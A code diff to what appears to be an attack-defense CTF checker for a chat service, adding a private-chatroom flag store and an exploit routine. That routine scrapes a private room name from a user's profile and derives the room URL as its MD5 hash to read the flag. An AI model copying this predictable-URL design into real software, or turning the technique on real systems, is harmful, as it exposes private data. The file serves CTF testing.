@@ -19,7 +19,7 @@ from selenium import webdriver
 from webdriver_manager.chrome import ChromeDriverManager
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import threading
-
+import hashlib
 
 HOST = "localhost"
 PORT = 6452
@@ -69,6 +69,12 @@ async def retrieveMessage(task, client, recipient, logger, username, password):
     assert_equals(r.status_code, 200, "retrieving message failed")
     return r
 
+async def createPrivateChatroom(task, name, client, cookie, logger):
+    logger.debug(f"Creating private chatroom {name}")
+    r = await client.post(f"http://{task.address + ':' + str(SERVICE_PORT)}/chatroom?roomname={name}&public=false", cookies=cookie)
+    assert_equals(r.status_code, 200, "creating private chatroom failed")
+    return r.text
+
 @checker.putflag(0)
 async def putflag0(task: PutflagCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB, logger: LoggerAdapter) -> str:
     flag = task.flag
@@ -81,6 +87,21 @@ async def putflag0(task: PutflagCheckerTaskMessage, client: AsyncClient, chain_d
     return json.dumps({'username': username})
 
 
+@checker.putflag(1)
+async def putflag1(task: PutflagCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB, logger: LoggerAdapter) -> str:
+    flag = task.flag
+    username = secrets.token_hex(32)
+    password = secrets.token_hex(32)
+    cookie = await register(task, client, username, password, logger)
+    roomName = secrets.token_hex(32)
+    roomUrl = await createPrivateChatroom(task, roomName, client, cookie, logger)
+    logger.debug(f"Created private chatroom {roomName} with url {roomUrl}")
+    r = await client.get(f"http://{task.address + ':' + str(SERVICE_PORT)}/chatroom/{roomUrl}", cookies=cookie)
+    logger.debug(f"Got chatroom {r.text}")
+    r = await client.post(f"http://{task.address + ':' + str(SERVICE_PORT)}/chatroom/{roomUrl}/messages", json={"message": flag}, cookies=cookie)
+    await chain_db.set("userdata", (username, password, flag, roomUrl))
+    return json.dumps({'username': username})
+
 @checker.getflag(0)
 async def getflag0(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
     start = time.time()
@@ -91,6 +112,17 @@ async def getflag0(task: GetflagCheckerTaskMessage, client: AsyncClient, db: Cha
     r = await retrieveMessage(task, client, "admin", logger, username, password)
     assert_in(task.flag, r.text, "flag missing from note")
     # xss(task, start, logger)
+
+@checker.getflag(1)
+async def getflag1(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
+    try:
+        username, password, flag, roomUrl = await db.get("userdata")
+    except KeyError:
+        raise MumbleException("Missing database entry from putflag")
+    cookie = await login(task, client, username, password, logger)
+    r = await client.get(f"http://{task.address + ':' + str(SERVICE_PORT)}/chatroom/{roomUrl}", cookies=cookie)
+    assert_in(task.flag, r.text, "flag missing from note")
+
 
 @checker.putnoise(0)
 async def putnoise0(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB, logger: LoggerAdapter) -> None:
@@ -195,6 +227,23 @@ def xss_test(task, logger):
     time.sleep(1)
     driver.close()
 
+
+@checker.exploit(1)
+async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger:LoggerAdapter) -> Optional[str]:
+    username = secrets.token_hex(32)
+    password = secrets.token_hex(32)
+    cookie = await register(task, client, username, password, logger)
+    target = json.loads(task.attack_info)['username']
+    logger.debug('Accessing profile of ' + target)
+    r = await client.get(f"http://{task.address + ':' + str(SERVICE_PORT)}/profile/{target}", cookies=cookie)
+    if len(r.text.split('<h3>')) < 2:
+        return
+    roomName = r.text.split('<h3>')[1].split('</h3>')[0]
+    roomUrl = hashlib.md5(roomName.encode()).hexdigest()
+    logger.debug('Accessing chatroom ' + roomUrl + ' of ' + roomName)
+    r = await client.get(f"http://{task.address + ':' + str(SERVICE_PORT)}/chatroom/{roomUrl}", cookies=cookie)
+    if flag := searcher.search_flag(r.text):
+        return flag
 
 if __name__ == "__main__":
     checker.run()
